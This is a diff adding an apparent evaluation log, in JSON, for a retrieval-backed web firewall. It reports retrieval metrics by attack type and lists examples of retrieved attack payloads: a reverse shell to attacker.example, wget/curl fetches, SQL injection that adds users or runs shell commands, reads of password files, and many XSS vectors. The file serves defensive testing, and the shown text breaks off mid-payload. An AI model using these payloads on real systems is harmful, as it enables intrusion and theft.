@@ -1,0 +1,732 @@
+{
+  "timestamp": "2026-04-24T01:39:58.036849+00:00",
+  "dataset": "csv",
+  "split": "train",
+  "data_file": "data/final_clean_small_plus_cmdi_subset_balanced.csv",
+  "dataset_columns": {
+    "available": [
+      "attack_type",
+      "difficulty_bucket",
+      "difficulty_score",
+      "label",
+      "raw_request",
+      "request_id",
+      "request_len",
+      "sample_id",
+      "source_dataset",
+      "source_payload"
+    ],
+    "query_column": "raw_request",
+    "label_column": "label",
+    "attack_type_column": "attack_type",
+    "sample_id_column": "sample_id"
+  },
+  "config": {
+    "top_k": 3,
+    "min_score": 0.0,
+    "benign_samples": 100,
+    "malicious_samples": 700,
+    "use_gatekeeper": true,
+    "gatekeeper_enabled": true,
+    "debug_enabled": false,
+    "debug_csv_path": "logs/debug_pipeline.csv",
+    "rag_enabled": true,
+    "qdrant_collection": "waf_payloads_v7",
+    "shuffle": true,
+    "seed": 42
+  },
+  "counts": {
+    "total_samples": 800,
+    "malicious_samples": 700,
+    "benign_samples": 100,
+    "errors": 0,
+    "query_mode_distribution": {
+      "raw_http": 800
+    },
+    "attack_type_distribution": {
+      "Command Injection": 100,
+      "SQLi": 100,
+      "Path Traversal": 100,
+      "LDAP Injection": 100,
+      "XPath Injection": 100,
+      "XSS": 100,
+      "SSI": 100
+    }
+  },
+  "malicious_retrieval": {
+    "count": 700,
+    "successful": 700,
+    "errors": 0,
+    "hit_at_k": 0.83,
+    "precision_at_k": 0.5604761904761905,
+    "mrr": 0.7435714285714285,
+    "ndcg_at_k": 0.7591951532300335,
+    "average_relevant_hits": 1.6814285714285715,
+    "average_returned_results": 2.82,
+    "mean_top1_score": 0.6648581074772036,
+    "p95_top1_score": 1.0
+  },
+  "benign_noise": {
+    "count": 100,
+    "successful": 100,
+    "errors": 0,
+    "hit_at_k": 0.0,
+    "precision_at_k": 0.0,
+    "mrr": 0.0,
+    "ndcg_at_k": 0.0,
+    "average_relevant_hits": 0.0,
+    "average_returned_results": 2.67,
+    "mean_top1_score": 0.5163857685393258,
+    "p95_top1_score": 0.5,
+    "context_return_rate": 0.89
+  },
+  "per_attack_type": {
+    "Command Injection": {
+      "count": 100,
+      "successful": 100,
+      "errors": 0,
+      "hit_at_k": 0.62,
+      "precision_at_k": 0.4433333333333333,
+      "mrr": 0.55,
+      "ndcg_at_k": 0.5600702080164609,
+      "average_relevant_hits": 1.33,
+      "average_returned_results": 2.1,
+      "mean_top1_score": 0.6284372302857143,
+      "p95_top1_score": 1.0
+    },
+    "LDAP Injection": {
+      "count": 100,
+      "successful": 100,
+      "errors": 0,
+      "hit_at_k": 0.64,
+      "precision_at_k": 0.35,
+      "mrr": 0.5466666666666666,
+      "ndcg_at_k": 0.5668805892385406,
+      "average_relevant_hits": 1.05,
+      "average_returned_results": 2.88,
+      "mean_top1_score": 0.5912046875,
+      "p95_top1_score": 1.0
+    },
+    "Path Traversal": {
+      "count": 100,
+      "successful": 100,
+      "errors": 0,
+      "hit_at_k": 0.85,
+      "precision_at_k": 0.6833333333333332,
+      "mrr": 0.7883333333333333,
+      "ndcg_at_k": 0.8038094315338821,
+      "average_relevant_hits": 2.05,
+      "average_returned_results": 2.97,
+      "mean_top1_score": 0.7315771812121211,
+      "p95_top1_score": 1.0
+    },
+    "SQLi": {
+      "count": 100,
+      "successful": 100,
+      "errors": 0,
+      "hit_at_k": 0.9,
+      "precision_at_k": 0.5833333333333333,
+      "mrr": 0.73,
+      "ndcg_at_k": 0.7696179133795664,
+      "average_relevant_hits": 1.75,
+      "average_returned_results": 2.97,
+      "mean_top1_score": 0.5420479867676768,
+      "p95_top1_score": 0.75
+    },
+    "SSI": {
+      "count": 100,
+      "successful": 100,
+      "errors": 0,
+      "hit_at_k": 0.93,
+      "precision_at_k": 0.6366666666666666,
+      "mrr": 0.9066666666666667,
+      "ndcg_at_k": 0.9084268089207785,
+      "average_relevant_hits": 1.91,
+      "average_returned_results": 2.91,
+      "mean_top1_score": 0.8601374604123712,
+      "p95_top1_score": 1.0
+    },
+    "XPath Injection": {
+      "count": 100,
+      "successful": 100,
+      "errors": 0,
+      "hit_at_k": 0.94,
+      "precision_at_k": 0.4766666666666666,
+      "mrr": 0.8116666666666668,
+      "ndcg_at_k": 0.8265954140352164,
+      "average_relevant_hits": 1.43,
+      "average_returned_results": 2.97,
+      "mean_top1_score": 0.646474852121212,
+      "p95_top1_score": 1.0
+    },
+    "XSS": {
+      "count": 100,
+      "successful": 100,
+      "errors": 0,
+      "hit_at_k": 0.93,
+      "precision_at_k": 0.75,
+      "mrr": 0.8716666666666667,
+      "ndcg_at_k": 0.8789657074857898,
+      "average_relevant_hits": 2.25,
+      "average_returned_results": 2.94,
+      "mean_top1_score": 0.6449708464285714,
+      "p95_top1_score": 1.0
+    }
+  },
+  "failures": {
+    "count": 0,
+    "examples": []
+  },
+  "example_misses": [
+    {
+      "sample_id": "xml_test-35982",
+      "attack_type": "Path Traversal",
+      "top_categories": "SQLi,Command Injection,Command Injection",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: ; exec master..xp_cmdshell",
+        "Attack Type: Command Injection | Payload: & type C:\\WINNT\\repair\\SAM",
+        "Attack Type: Command Injection | Payload: type C:\\WINNT\\repair\\SYSTEM"
+      ],
+      "retrieved_topk_source_files": [
+        "restored_sqli_after_audit.jsonl",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-37723",
+      "attack_type": "LDAP Injection",
+      "top_categories": "XSS,Path Traversal,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: XSS | Payload: <script>'str1ng'.replace(/1/,alert)</script> <script>'bbbalert(1)cccc'.replace(/a\\w{4}\\(\\d\\)/,eval)</script> <script>'a1l2e3r4t6'.replace(/(.).(.).(.).(.).(.)/,function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script>",
+        "Attack Type: Path Traversal | Payload: /../../../../../../../../../../../etc/passwd%00.jpg",
+        "Attack Type: SQLi | Payload: conv('a',16,2)=conv('a',16,2)"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-46606",
+      "attack_type": "XSS",
+      "top_categories": "Command Injection,SQLi,Command Injection",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: %22;echo$IFSKDCQSI$((18%2B31))$(echo$IFSKDCQSI)KDCQSI'",
+        "Attack Type: SQLi | Payload: and (select substring(@@version,2,1))='i'",
+        "Attack Type: Command Injection | Payload: \";echo$IFSLFGEOY$((22%2B44))$(echo$IFSLFGEOY)LFGEOY//"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-48465",
+      "attack_type": "XPath Injection",
+      "top_categories": "SQLi,XSS,XSS",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: LNNVL(0=123)",
+        "Attack Type: XSS | Payload: <output onbeforecut=\"alert(1)\" contenteditable>test</output>",
+        "Attack Type: XSS | Payload: <div id=\"29\"><link rel=stylesheet href=data:,*%7bx:expression(alert(29))%7d//[\"'`-->]]>]</div><div id=\"30\"><style>@import \"data:,*%7bx:expression(alert(30))%7D\";</style>//[\"'`-->]]>]</div><div id=\"31\"><frameset onload=alert(31)>//[\"'`-->]]>]</div><div id=\"32\"><table background=\"javascript:alert(32)\"></table>//[\"'`-->]]>]</div><div id=\"33\"><a style=\"pointer-events:none;position:absolute;\"><a style=\"position:absolute;\" onclick=\"alert(33);\">XXX</a></a><a href=\"javascript:alert(2)\">XXX</a>//[\"'`-->]]>]</div><div id=\"34\">1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=test.vml#xss></vmlframe>//[\"'`-->]]>]</div><div id=\"35\">1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(35) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>//[\"'`-->]]>]</div><div id=\"36\"><a style=\"behavior:url(#default#AnchorClick);\" folder=\"javascript:alert(36)\">XXX</a>//[\"'`-->]]>]</div><div id=\"37\"><!--<img src=\"--><img src=x onerror=alert(37)//\">//[\"'`-->]]>]</div><div id=\"38\"><comment><img src=\"</comment><img src=x onerror=alert(38)//\">//[\"'`-->]]>]</div>"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "patt-command-injection-0910",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "patt-command-injection-0806",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "kaggle-cmdi-035",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "xml_test-46078",
+      "attack_type": "Path Traversal",
+      "top_categories": "SSI,XSS,XSS",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SSI | Payload: <!--#echo var=\"path_info\" -->",
+        "Attack Type: XSS | Payload: <a target=\"x\" href=\"xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>",
+        "Attack Type: XSS | Payload: <a target=\"x\" href=\"xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-48493",
+      "attack_type": "XPath Injection",
+      "top_categories": "SQLi,Command Injection,XSS",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11",
+        "Attack Type: Command Injection | Payload: %26echo%20SGEJFS$((3%2B63))$(echo%20SGEJFS)SGEJFS%27",
+        "Attack Type: XSS | Payload: <slot onmouseup=\"alert(1)\">test</slot>"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "patt-command-injection-0926",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "patt-command-injection-0938",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "xml_test-40707",
+      "attack_type": "SSI",
+      "top_categories": "Command Injection,SQLi,XSS",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: ;echo%20BSAABA$((22%2B11))$(echo%20BSAABA)BSAABA&",
+        "Attack Type: SQLi | Payload: RAWTOHEX('AB')=RAWTOHEX('AB')",
+        "Attack Type: XSS | Payload: <rtc onmousemove=\"alert(1)\">test</rtc>"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "patt-ldap-injection-0108",
+      "attack_type": "LDAP Injection",
+      "top_categories": "SQLi,SQLi,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--",
+        "Attack Type: SQLi | Payload: ' || myappadmin.adduser('admin', 'newpass') || '",
+        "Attack Type: SQLi | Payload: admin' OR '1'='1"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "restored_sqli_after_audit.jsonl",
+        ""
+      ]
+    },
+    {
+      "sample_id": "kaggle-cmdi-034",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "xml_test-41743",
+      "attack_type": "SQLi",
+      "top_categories": "Command Injection,Command Injection,Command Injection",
+      "top1_score": 0.75,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: & wget http://crowdshield.com/.testing/rce.txt",
+        "Attack Type: Command Injection | Payload: ; wget https://crowdshield.com/.testing/rce_vuln.txt",
+        "Attack Type: Command Injection | Payload: %22;echo$IFSRBNXNK$((31%2B22))$(echo$IFSRBNXNK)RBNXNK|"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "patt-ldap-injection-0041",
+      "attack_type": "LDAP Injection",
+      "top_categories": "Command Injection,XSS,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: ; system('curl https://crowdshield.com/.testing/rce_vuln.txt');",
+        "Attack Type: XSS | Payload: <div id=\"1\"><form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>//[\"'`-->]]>]</div><div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[\"'`-->]]>]</div><div id=\"3\"><meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[\"'`-->]]>]</div><div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div><div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div><div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div><div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div><div id=\"8\"><input onblur=alert(8) autofocus><input autofocus>//[\"'`-->]]>]</div><div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`-->]]>]</div><div id=\"10\"><video poster=javascript:alert(10)//></video>//[\"'`-->]]>]</div><div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(11)\"></g></svg>//[\"'`-->]]>]</div><div id=\"12\"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[\"'`-->]]>]</div><div id=\"13\"><x repeat=\"template\" repeat-start=\"999999\">0<y repeat=\"template\" repeat-start=\"999999\">1</y></x>//[\"'`-->]]>]</div><div id=\"14\"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[\"'`-->]]>]</div><div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div><div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div><div id=\"17\"><?xml-stylesheet href=\"javascript:alert(17)\"?><root/>//[\"'`-->]]>]</div><div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">&#x61;l&#x65;rt&#40;1)</script>//[\"'`-->]]>]</div><div id=\"19\"><meta charset=\"x-mac-farsi\">\u00bcscript \u00bealert(19)//\u00bc/script \u00be//[\"'`-->]]>]</div><div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div><div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div><div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div><div id=\"23\"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[\"'`-->]]>]</div><div id=\"24\">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//[\"'`-->]]>]</div><div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div><div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div><div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`-->]]>]</div>",
+        "Attack Type: SQLi | Payload: ' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-42943",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "kaggle-cmdi-010",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "patt-command-injection-0854",
+      "attack_type": "Command Injection",
+      "top_categories": "",
+      "top1_score": null,
+      "retrieved_topk_payloads": [],
+      "retrieved_topk_source_files": []
+    },
+    {
+      "sample_id": "patt-ldap-injection-0016",
+      "attack_type": "LDAP Injection",
+      "top_categories": "SQLi,SQLi,SQLi",
+      "top1_score": 0.6,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: admin' OR '1'='1",
+        "Attack Type: SQLi | Payload: WHERE 1=1 AND 1=1#",
+        "Attack Type: SQLi | Payload: admin' AND 1=0 UNION ALL SELECT 'admin', '161ebd7d45089b3446ee4e0d86dbcf92'--"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    }
+  ],
+  "example_benign_noise": [
+    {
+      "sample_id": "xml_test-1669",
+      "top_categories": "SQLi,Path Traversal,SSI",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: UNION ALL SELECT 1,2,3,4,5,6,7,8,9",
+        "Attack Type: Path Traversal | Payload: /../../../../../../../../../../../etc/passwd%00.jpg",
+        "Attack Type: SSI | Payload: <esi:include src=http://attacker.com>"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-34149",
+      "top_categories": "Command Injection,SQLi,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: Command Injection | Payload: ; type C:\\Windows\\win.ini",
+        "Attack Type: SQLi | Payload: t'exec master..xp_cmdshell 'nslookup www.googl ...",
+        "Attack Type: SQLi | Payload: conv('a',16,2)=conv('a',16,2)"
+      ],
+      "retrieved_topk_source_files": [
+        "rag_enrich_cmdi.jsonl",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-34833",
+      "top_categories": "SQLi,SSI,Command Injection",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: '||utl_http.request('httP://192.168.1.1/')||'",
+        "Attack Type: SSI | Payload: <pre><!--#exec cmd=\"ls\" --></pre>",
+        "Attack Type: Command Injection | Payload: ;bash -i >& /dev/tcp/attacker.example/4444 0>&1"
+      ],
+      "retrieved_topk_source_files": [
+        "restored_sqli_after_audit.jsonl",
+        "",
+        "rag_enrich_cmdi_round2.jsonl"
+      ]
+    },
+    {
+      "sample_id": "xml_test-34403",
+      "top_categories": "XSS,Path Traversal,SQLi",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: XSS | Payload: <div id=\"1\"><form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>//[\"'`-->]]>]</div><div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[\"'`-->]]>]</div><div id=\"3\"><meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[\"'`-->]]>]</div><div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div><div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div><div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div><div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div><div id=\"8\"><input onblur=alert(8) autofocus><input autofocus>//[\"'`-->]]>]</div><div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`-->]]>]</div><div id=\"10\"><video poster=javascript:alert(10)//></video>//[\"'`-->]]>]</div><div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(11)\"></g></svg>//[\"'`-->]]>]</div><div id=\"12\"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[\"'`-->]]>]</div><div id=\"13\"><x repeat=\"template\" repeat-start=\"999999\">0<y repeat=\"template\" repeat-start=\"999999\">1</y></x>//[\"'`-->]]>]</div><div id=\"14\"><input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>//[\"'`-->]]>]</div><div id=\"15\"><script>({0:#0=alert/#0#/#0#(0)})</script>//[\"'`-->]]>]</div><div id=\"16\">X<x style=`behavior:url(#default#time2)` onbegin=`alert(16)` >//[\"'`-->]]>]</div><div id=\"17\"><?xml-stylesheet href=\"javascript:alert(17)\"?><root/>//[\"'`-->]]>]</div><div id=\"18\"><script xmlns=\"http://www.w3.org/1999/xhtml\">&#x61;l&#x65;rt&#40;1)</script>//[\"'`-->]]>]</div><div id=\"19\"><meta charset=\"x-mac-farsi\">\u00bcscript \u00bealert(19)//\u00bc/script \u00be//[\"'`-->]]>]</div><div id=\"20\"><script>ReferenceError.prototype.__defineGetter__('name', function(){alert(20)}),x</script>//[\"'`-->]]>]</div><div id=\"21\"><script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(21)')()</script>//[\"'`-->]]>]</div><div id=\"22\"><input onblur=focus() autofocus><input>//[\"'`-->]]>]</div><div id=\"23\"><form id=test onforminput=alert(23)><input></form><button form=test onformchange=alert(2)>X</button>//[\"'`-->]]>]</div><div id=\"24\">1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=alert(24)&gt;`>//[\"'`-->]]>]</div><div id=\"25\"><script src=\"#\">{alert(25)}</script>;1//[\"'`-->]]>]</div><div id=\"26\">+ADw-html+AD4APA-body+AD4APA-div+AD4-top secret+ADw-/div+AD4APA-/body+AD4APA-/html+AD4-.toXMLString().match(/.*/m),alert(RegExp.input);//[\"'`-->]]>]</div><div id=\"27\"><style>p[foo=bar{}*{-o-link:'javascript:alert(27)'}{}*{-o-link-source:current}*{background:red}]{background:green};</style>//[\"'`-->]]>]</div>",
+        "Attack Type: Path Traversal | Payload: /../../../../../../../../../../../etc/passwd%00.jpg",
+        "Attack Type: SQLi | Payload: declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-34719",
+      "top_categories": "SQLi,XSS,SSI",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: copy myfile from '/etc/passwd';",
+        "Attack Type: XSS | Payload: <script>'str1ng'.replace(/1/,alert)</script> <script>'bbbalert(1)cccc'.replace(/a\\w{4}\\(\\d\\)/,eval)</script> <script>'a1l2e3r4t6'.replace(/(.).(.).(.).(.).(.)/,function(match,$1,$2,$3,$4,$5) { this[$1+$2+$3+$4+$5](1); })</script>",
+        "Attack Type: SSI | Payload: <!--#exec cmd=\"cd C:\\WINDOWS\\System32\">"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-33876",
+      "top_categories": "XSS,SQLi,Command Injection",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: XSS | Payload: <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>",
+        "Attack Type: SQLi | Payload: \"))) and 0=benchmark(3000000,MD5(1))%20--",
+        "Attack Type: Command Injection | Payload: \";echo$IFSLFGEOY$((22%2B44))$(echo$IFSLFGEOY)LFGEOY//"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-5176",
+      "top_categories": "SQLi,Command Injection,Command Injection",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: SQLi | Payload: UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#",
+        "Attack Type: Command Injection | Payload: ;netstat -a;",
+        "Attack Type: Command Injection | Payload: \";echo$IFSLFGEOY$((22%2B44))$(echo$IFSLFGEOY)LFGEOY//"
+      ],
+      "retrieved_topk_source_files": [
+        "",
+        "",
+        ""
+      ]
+    },
+    {
+      "sample_id": "xml_test-34572",
+      "top_categories": "XSS,XSS,XSS",
+      "top1_score": 0.5,
+      "retrieved_topk_payloads": [
+        "Attack Type: XSS | Payload: <link href=validstyles.css rel=stylesheet onload=alert(1)>",
+        "Attack Type: XSS | Payload: <div id=\"1\"><form id=\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">X</button>//[\"'`-->]]>]</div><div id=\"2\"><meta charset=\"x-imap4-modified-utf7\">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi//[\"'`-->]]>]</div><div id=\"3\"><meta charset=\"x-imap4-modified-utf7\">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>//[\"'`-->]]>]</div><div id=\"4\">0?<script>Worker(\"#\").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))//[\"'`-->]]>]</div><div id=\"5\"><script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(5)',384,null,'rsa-dual-use')</script>//[\"'`-->]]>]</div><div id=\"6\"><script>({set/**/$($){_/**/setter=$,_=1}}).$=alert</script>//[\"'`-->]]>]</div><div id=\"7\"><input onfocus=alert(7) autofocus>//[\"'`-->]]>]</div><div id=\"8\"><input onblur=alert(8) autofocus><input autofocus>//[\"'`-->]]>]</div><div id=\"9\"><a style=\"-o-link:'javascript:alert(9)';-o-link-source:current\">X</a>//[\"'`-->]]>]</div><div id=\"10\"><video poster=javascript:alert(10)//></video>//[\"'`-->]]>]</div><div id=\"11\"><svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert(11)\"></g></svg>//[\"'`-->]]>]</div><div id=\"12\"><body onscroll=alert(12)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>//[\"'`-->]]>]</div><div id=\"13\"><x repeat=\"template\" repeat-start=\"999999\">0<y repeat=\"template\" 